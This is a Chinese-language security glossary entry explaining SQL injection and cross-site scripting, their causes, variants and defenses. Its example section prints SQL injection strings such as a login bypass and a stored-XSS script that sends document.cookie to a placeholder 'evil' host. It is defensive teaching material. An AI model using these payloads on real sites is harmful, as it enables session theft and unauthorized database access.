# SQL注入与XSS


> 📌 **导航**：本文是 **SQL注入与XSS** 词条，属于 security 术语集。相关枢纽：[[公钥基础设施]]、[[密码学基础篇]]、[[零信任安全架构]]。

## 定义

**一句话定义：** SQL 注入与 XSS(跨站脚本)是两种最常见的 Web 应用攻击——SQL 注入把恶意 SQL 拼入输入以操纵后端数据库;XSS 把恶意脚本注入页面、在其他用户浏览器中执行以窃取会话或篡改页面;二者根源都是"未经验证/转义的用户输入被当作代码执行"。

**通俗类比：** SQL 注入像你在"姓名"栏不只写名字,还夹带一句"顺便把保险柜打开"的指令,系统若照单全收就中招;XSS 像在公告板贴了一张"会自己动的告示",谁看公告板谁就被这段脚本执行(如偷走登录状态)。

## 为什么需要它

Web 应用的基本动作就是把用户输入送进某个解释器——SQL 引擎或浏览器。只要字符串拼接没被结构化协议隔开,输入就能越级变成指令。SQL 注入打到数据库那一侧,能拖库、改数据甚至借数据库能力执行命令;XSS 打的却是"别的用户":服务端信任了自己吐出的页面,于是受害者浏览器带着他的登录态去执行攻击者的脚本。二者长期占据 OWASP Top 10,正因为触发门槛低、代码里一处遗漏就够。

## 核心机制

- **SQL 注入:** 应用把用户输入直接拼接进 SQL(如 `WHERE name='" + input + "'"`),输入含 `' OR '1'='1` 等即改变语义;类型有联合查询注入、报错注入、盲注、时间盲注。
- **XSS:** 分存储型(恶意脚本存入服务端,他人访问时触发)、反射型(脚本在请求参数中被即时反射执行)、DOM 型(前端 DOM 操作不当)。
- **共同根因:** 数据与代码未分离、缺乏输入验证与输出编码。
- **防御要素:** 消灭注入点(参数化/预编译)、按上下文输出编码(HTML/JS/URL)、CSP 限制脚本来源、HttpOnly Cookie、数据库账号最小权限。

## 具体示例

登录框拼出 `WHERE name='admin' --' AND pass=''`,注释符把后半段密码判断吃掉,不验密码即通过——这是 SQL 注入。评论区写入 `<script>fetch('//evil?c='+document.cookie)</script>`,服务端若原样回吐、Cookie 又没设 HttpOnly,每个看到这条评论的用户都会把会话 Cookie 送给攻击者——这是存储型 XSS,也是三型里危害最大的一型,因为它一次命中所有访问者。

## 何时用与何时不用

- **必做:** 参数化查询/预编译语句(防 SQL 注入的根本手段)、按上下文输出转义、CSP、HttpOnly Cookie、数据库账号最小权限;用 ORM 但别拼 raw SQL。
- **别指望:** 只做前端校验(请求可绕过浏览器直接构造);只靠 WAF 兜底(代码层漏洞仍在);把"过滤关键词"当安全边界;ORM 自带的字符串拼接同样会注入。

## 优劣与代价

✅ 参数化从根本上分离代码与数据,一处改对即免疫该类注入。
✅ 输出编码 + CSP + HttpOnly 多层叠加,可把 XSS 从"必成"压到"需要绕过"。
⚠️ 防护必须全链路一致——一处遗漏即成漏洞,遗留代码改造成本高。
⚠️ CSP 配置复杂,报告模式与强制模式之间要权衡;二阶注入(入库后再输出)这类变体防不胜防。

## 与相关概念的区别

- **SQL 注入 vs XSS:** 前者落点在后端数据库,后者执行点在别的用户浏览器;修法却是同一件事的两侧——别让输入变成代码。
- **存储型 vs 反射型 vs DOM 型:** 区别只在恶意脚本的落地位置——服务端数据库、当次响应,还是前端 JS 自身。
- **XSS vs CSRF:** XSS 是"在你的页面里执行我的代码",CSRF 是"借你的身份发一个请求",后者根本不需要注入脚本。

## 常见误区

- 只要过滤掉单引号、分号和 `--` 这些字符,就不存在 SQL 注入了。
- 前端已经校验过输入,后端就不必再校验。
- XSS 不过是弹个窗恶作剧,危害有限。
